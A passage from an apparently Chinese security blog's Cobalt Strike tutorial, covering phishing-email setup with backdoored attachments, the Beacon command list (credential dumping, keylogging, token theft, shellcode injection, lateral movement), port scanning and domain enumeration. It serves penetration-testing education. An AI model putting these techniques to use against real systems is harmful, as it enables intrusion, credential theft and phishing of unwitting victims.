的钓鱼模板，可在邮箱中直接导出</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151037731.png\" alt=\"image-20220924151037731\"></p>\n<ul>\n<li>准备好 eml 文件后，参数设置如下</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">目标：目标邮箱，使用文件一个一行以列表形式加载\n模板：保存的eml文件\n附件：打开邮件后下载的文件，可以放后门木马\n嵌入url：将邮件中的原有连接替换为需要的连接\n邮件服务器：使用的邮箱的服务器<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151634774.png\" alt=\"image-20220924151634774\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151701739.png\" alt=\"image-20220924151701739\"></p>\n<ul>\n<li>发送的钓鱼邮件如下，此时由于设置了嵌入 url 选项，点击这个链接会跳转到 baidu</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924151900399.png\" alt=\"image-20220924151900399\"></p>\n<h1 id=\"7-beacon的使用\"><a class=\"markdownIt-Anchor\" href=\"#7-beacon的使用\">#</a> 7、beacon 的使用</h1>\n<ul>\n<li>\n<p>Beacon 是 Cobalt Strike 为高级攻击者建模的 Payload。使用 Beacon 通过 HTTP，HTTPS 或 DNS 出口网络。而且 Beacon 非常灵活，支持异步和交互式通信。异步通信既低又慢。Beacon 将通讯本地，下载任务，然后进入睡眠状态。交互式通信实时发生。</p>\n</li>\n<li>\n<p>主机上线后右键主机选择交互会话打开 beacon 命令行</p>\n</li>\n</ul>\n<h2 id=\"71-beacon的命令\"><a class=\"markdownIt-Anchor\" href=\"#71-beacon的命令\">#</a> 7.1 beacon 的命令</h2>\n<ul>\n<li>在 beacon 会话中使用 <code>help</code>  可查看帮助文档，help command 可查看具体命令帮助</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Command Description\n------- -----------\nargue 命令行参数欺骗\nblockdlls 禁止子进程加载非微软签名的dll\nbrowserpivot 注入浏览器进程代理用户已认证身份（仅支持IE）\ncancel 取消正在下载的文件\ncd 跳转目录\ncheckin 强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver）\nchromedump 提取Chrome保存的账号密码、Cookies等信息\nclear 清空beacon任务队列\nconnect 通过TCP正向连接远程Beacon\ncovertvpn 部署Covert VPN客户端\ncp 复制文件\ndcsync 从域控提取密码hash\ndesktop 远程VNC控制用户桌面\ndllinject 注入一个内存反射加载的dll到目标进程\ndllload 使用LoadLibrary方式在目标进程中加载一个dll\ndownload 下载文件\ndownloads 列出所有正在下载的文件\ndrives 列出所有磁盘盘符\nelevate 利用提权漏洞获取一个高权限Beacon\nexecute 在目标上执行程序（无回显）\nexecute-assembly 在目标上内存加载执行本地.NET程序\nexit 结束当前Beacon会话\ngetprivs 在当前进程访问令牌（access token）中启用system特权\ngetsystem 尝试获取SYSTEM用户权限\ngetuid 获取当前进程访问令牌（access token）的用户信息\nhashdump 获取本地用户hash\nhelp 帮助信息\ninject 在指定进程中注入新的Beacon会话\ninline-execute 在当前会话中执行Beacon Object File\njobkill 结束一个后台任务\njobs 列出所有后台任务\njump 在远程机器上植入Beacon（横向移动）\nkerberos_ccache_use 从ccache文件导入kerberos票据到当前会话中\nkerberos_ticket_purge 清空当前会话中的所有kerberos票据\nkerberos_ticket_use 从ticket文件中导入kerberos票据到当前会话中\nkeylogger 开启键盘记录\nkill 结束指定进程\nlink 通过命名管道正向连接远程Beacon\nlogonpasswords 使用mimikatz获取密码和hash\nls 列出目录文件\nmake_token 创建进程访问令牌（access token），仅用于访问网络资源\nmimikatz 运行mimikatz\nmkdir 创建目录\nmode dns 使用DNS A记录作为数据通道（仅支持DNS上线Beacon）\nmode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）\nmode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）\nmv 移动文件\nnet 网络和主机探测工具（内置net命令）\nnote 给当前会话添加备注信息\nportscan 网络端口扫描\npowerpick 内存执行Powershell命令（不调用powershell.exe）\npowershell 通过powershell.exe执行Powershell命令\npowershell-import 导入本地powershell脚本到当前会话中\nppid 为所有新运行的进程设置伪造的父进程PID\nprintscreen 使用PrintScr方式截屏\nps 显示进程列表\npsinject 注入到指定进程后在内存中执行Powershell命令（不调用\npowershell.exe)\npth 使用Mimikatz执行Pass-the-hash\npwd 显示当前目录\nreg 查询注册表\nremote-exec 在远程机器上执行命令（横向移动）\nrev2self 恢复原始进程访问令牌（access token）\nrm 删除文件或文件夹\nrportfwd 反向端口转发（从Cobalt Strike Teamserver发起连接）\nrportfwd_local 反向端口转发（从Cobalt Strike客户端发起连接）\nrun 在目标上执行程序（有回显）\nrunas 以另一个用户身份执行程序\nrunasadmin 以高权限执行程序\nrunu 以另一个进程PID作为父进程PID，并以其用户身份执行程序\nscreenshot 截屏\nscreenwatch 屏幕监控，每隔一段时间截屏\nsetenv 设置环境变量\nshell 使用cmd.exe执行命令\nshinject 注入shellcode到指定进程中\nshspawn 创建傀儡进程并注入shellcode到其中运行\nsleep 设置beacon回连间隔时间\nsocks 启动SOCKS4a代理服务器\nsocks stop 停止SOCKS4a代理服务器\nspawn 创建一个新Beacon会话\nspawnas 以另一个用户身份创建一个新Beacon会话\nspawnto 设置创建新进程时使用的可执行文件路径（傀儡进程的宿主exe文件路径）\nspawnu 以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话\nspunnel 运行第三方agent shellcode并将其反向代理到控制端（从CobaltStrike Teamserver发起连接）\nspunnel_local 运行第三方agent shellcode并将其反向代理到控制端（从CobaltStrike客户端发起连接）\nssh 通过SSH连接远程主机（使用账号密码认证）\nssh-key 通过SSH连接远程主机（使用证书私钥认证）\nsteal_token 从指定进程中窃取访问令牌（access token)\ntimestomp 复制B文件的创建、访问、修改时间戳到A文件（文件时间戳伪造）\nunlink 断开与beacon的连接（用于通过TCP、命名管道连接的beacon）\nupload 上传文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"72-心跳时间\"><a class=\"markdownIt-Anchor\" href=\"#72-心跳时间\">#</a> 7.2 心跳时间</h2>\n<ul>\n<li>beacon 的默认心跳时间是 60s，即 60 秒受害机器与服务器进行一次通信，一般在 beacon 中将 sleep 设置为 5，设置为 0 则表示即时通信，使用 socks 代理需要设置 sleep 为 0</li>\n<li>sleep 为 0 时称 beacon 为交互模式</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924152724011.png\" alt=\"image-20220924152724011\"></p>\n<h2 id=\"73-执行cmd命令\"><a class=\"markdownIt-Anchor\" href=\"#73-执行cmd命令\">#</a> 7.3 执行 cmd 命令</h2>\n<ul>\n<li>在 beacon 中执行 cmd 命令需要在命令前加 <code>shell</code> ，如 <code>shell ipconfig</code></li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924152827931.png\" alt=\"image-20220924152827931\"></p>\n<h2 id=\"74-截图\"><a class=\"markdownIt-Anchor\" href=\"#74-截图\">#</a> 7.4 截图</h2>\n<ul>\n<li>在上线主机中右键<mark>浏览探测 -&gt; 屏幕截图</mark>或直接在 beacon 中输入 <code>screenshot</code>  可进行屏幕截图</li>\n<li>截图结果在<mark>视图 -&gt; 屏幕截图</mark>中查看</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153138542.png\" alt=\"image-20220924153138542\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153151816.png\" alt=\"image-20220924153151816\"></p>\n<h2 id=\"75-端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#75-端口扫描\">#</a> 7.5 端口扫描</h2>\n<ul>\n<li>右键主机，<mark>浏览探测 -&gt; 端口扫描</mark>进行端口扫描</li>\n<li>可以选择主机上的指定网卡进行网段扫描</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153302815.png\" alt=\"image-20220924153302815\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153426801.png\" alt=\"image-20220924153426801\"></p>\n<h2 id=\"76-网络探测\"><a class=\"markdownIt-Anchor\" href=\"#76-网络探测\">#</a> 7.6 网络探测</h2>\n<ul>\n<li>beacon 提供 <code>net</code>  命令进行网络探测， <code>help net</code>  查看命令帮助</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Use: net [命令] [参数]\nBeacon内置的主机和网络枚举探测工具。 支持的 [命令] 列表有：\n    命令 描述\n    ------- -----------\n    computers 列出域中的主机（通过组）\n    domain 显示该主机的域\n    dclist 列出域控制器\n    domain_controllers 列出域控制器（通过组）\n    domain_trusts 列出域信任\n    group 列出组中的成员组和成员用户\n    localgroup 列出本地组中的成员组和成员用户\n    logons 列出登录到指定主机的用户\n    sessions 列出指定主机上的会话\n    share 列出指定主机上的共享\n    user 列出用户和用户信息\n    time 显示指定主机上的时间\n    view 列出域中的主机（通过browser服务）\n使用 &quot;help net [命令]&quot; 了解更多信息<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><code>net view</code>  查看域中的主机</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153737549.png\" alt=\"image-20220924153737549\"></p>\n<ul>\n<li><code>net dclist</code>  列出域控</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153812390.png\" alt=\"image-20220924153812390\"></p>\n<h2 id=\"77-浏览器代理\"><a class=\"markdownIt-Anchor\" href=\"#77-浏览器代理\">#</a> 7.7 浏览器代理</h2>\n<ul>\n<li>jquery c2</li>\n<li>malleable-c2-master</li>\n</ul>\n","text":"# 1、Cobalt Strike 介绍 # 1.1 介绍 Cobalt Strike 是一款基于 java 的渗透测试神器，常被业界人称为 CS 神器。自 3.0 以后已经不在使用 Metasploit 框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"web安全","slug":"web安全","count":4,"path":"api/categories/web安全.json"}],"tags":[{"name":"web安全","slug":"web安全","count":4,"path":"api/tags/web安全.json"},{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#1-cobalt-strike%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\"> 1、Cobalt Strike 介绍</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\"> 1.1 介绍</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#12-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84\"><span class=\"toc-text\"> 1.2 目录结构</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#13-%E4%B8%AA%E4%BA%BA%E5%AE%9A%E5%88%B6\"><span class=\"toc-text\"> 1.3 个人定制</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#14-%E5%90%AF%E5%8A%A8%E8%BF%90%E8%A1%8C\"><span class=\"toc-text\"> 1.4 启动运行</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#15-%E5%81%8F%E5%A5%BD%E8%AE%BE%E7%BD%AE\"><span class=\"toc-text\"> 1.5 偏好设置</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#16-%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E\"><span class=\"toc-text\"> 1.6 参数说明</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2-%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%B8%8A%E7%BA%BF\"><span class=\"toc-text\"> 2、基础使用上线</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#21-http%E5%9C%B0%E5%9D%80%E4%B8%BA%E5%9F%9F%E5%90%8D\"><span class=\"toc-text\"> 2.1 HTTP 地址为域名</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#22-%E5%9F%BA%E7%A1%80%E7%9A%84windowsexe%E7%94%9F%E6%88%90\"><span class=\"toc-text\"> 2.2 基础的 windows.exe 生成</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#3-dns%E4%B8%8A%E7%BA%BF\"><span class=\"toc-text\"> 3、dns 上线</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#4-%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\"> 4、生成后门模块使用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#41-hta%E6%96%87%E6%A1%A3\"><span class=\"toc-text\"> 4.1 HTA 文档</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#42-office%E5%AE%8F\"><span class=\"toc-text\"> 4.2 Office 宏</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#43-payload%E7%94%9F%E6%88%90%E5%99%A8\"><span class=\"toc-text\"> 4.3 payload 生成器</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#44-windows%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F\"><span class=\"toc-text\"> 4.4 windows 可执行程序</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#441-exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F\"><span class=\"toc-text\"> 4.4.1 exe 可执行程序</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#442-service-exe%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F\"><span class=\"toc-text\"> 4.4.2 service exe 服务程序</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#443-windows-dll%E6%96%87%E4%BB%B6\"><span class=\"toc-text\"> 4.4.3 windows dll 文件</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#5-web%E9%92%93%E9%B1%BC%E6%A8%A1%E5%9D%97\"><span class=\"toc-text\"> 5、Web 钓鱼模块</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#51-%E7%AB%99%E7%82%B9%E7%AE%A1%E7%90%86\"><span class=\"toc-text\"> 5.1 站点管理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#52-%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99\"><span class=\"toc-text\"> 5.2 克隆网站</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#6-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC\"><span class=\"toc-text\"> 6、邮件钓鱼</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#7-beacon%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\"> 7、beacon 的使用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#71-beacon%E7%9A%84%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\"> 7.1 beacon 的命令</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#72-%E5%BF%83%E8%B7%B3%E6%97%B6%E9%97%B4\"><span class=\"toc-text\"> 7.2 心跳时间</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#73-%E6%89%A7%E8%A1%8Ccmd%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\"> 7.3 执行 cmd 命令</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#74-%E6%88%AA%E5%9B%BE\"><span class=\"toc-text\"> 7.4 截图</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#75-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\"> 7.5 端口扫描</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#76-%E7%BD%91%E7%BB%9C%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\"> 7.6 网络探测</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#77-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86\"><span class=\"toc-text\"> 7.7 浏览器代理</span></a></li></ol></li></ol>","author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Spring整合开发","uid":"73a343b3bf4c4ffd5c79fde677807ef2","slug":"Spring整合开发","date":"2022-10-06T14:07:13.000Z","updated":"2022-10-06T14:09:00.612Z","comments":true,"path":"api/articles/Spring整合开发.json","keywords":null,"cover":"https://th.bing.com/th/id/R.58a0316ef079d72d6ed90b6494564a8f?rik=QFgM6blbi3fbBA&riu=http%3a%2f%2fwx2.sinaimg.cn%2fbmiddle%2f705793b8gy1ga70rvx5fsj20tz0sfh8i.jpg&ehk=Jm1%2biA6ANdtXzXXEsN4EKxe9D3bklaum5umoDM2AyAo%3d&risl=&pid=ImgRaw&r=0&sres=1&sresct=1","text":"# 1、创建目录 目录结构如下 config：存放配置类 controller：表现层 service：业务层 dao：持久层 domain：POJO 类 # 2、用到的所有包坐标 &lt;dependencies> &lt;dependency> &lt;groupId>jun...","link":"","photos":[],"count_time":{"symbolsCount":"9.6k","symbolsTime":"9 mins."},"categories":[{"name":"JavaWeb","slug":"JavaWeb","count":13,"path":"api/categories/JavaWeb.json"}],"tags":[{"name":"JavaWeb","slug":"JavaWeb","count":13,"path":"api/tags/JavaWeb.json"}],"author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Metasploit内网篇","uid":"11f36b4318769a873345492b90cb8350","slug":"Metasploit内网篇","date":"2022-10-06T14:00:44.000Z","updated":"2022-10-06T14:01:51.809Z","comments":true,"path":"api/articles/Metasploit内网篇.json","keywords":null,"cover":"https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f2deb48f8c5494ee94b313482af5e0fe98257ec9.jpg","text":"#常用命令 sessions -K 结束全部会话 # 1、数据库后端 关于数据库操作： db_connect db_disconnect db_export db_import db_nmap db_rebuild_cache db_remove db_save db_statu...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"web安全","slug":"web安全","count":4,"path":"api/categories/web安全.json"}],"tags":[{"name":"web安全","slug":"web安全","count":4,"path":"api/tags/web安全.json"},{"name":"内网渗透","slug":"内网渗透","count":3,"path":"api/tags/内网渗透.json"}],"author":{"name":"cCor4ng3","slug":"blog-author","avatar":"http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/53BC80F5D1388E1A7955F40466B7F050.jpg","link":"/","description":"Fight 为 · Live","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}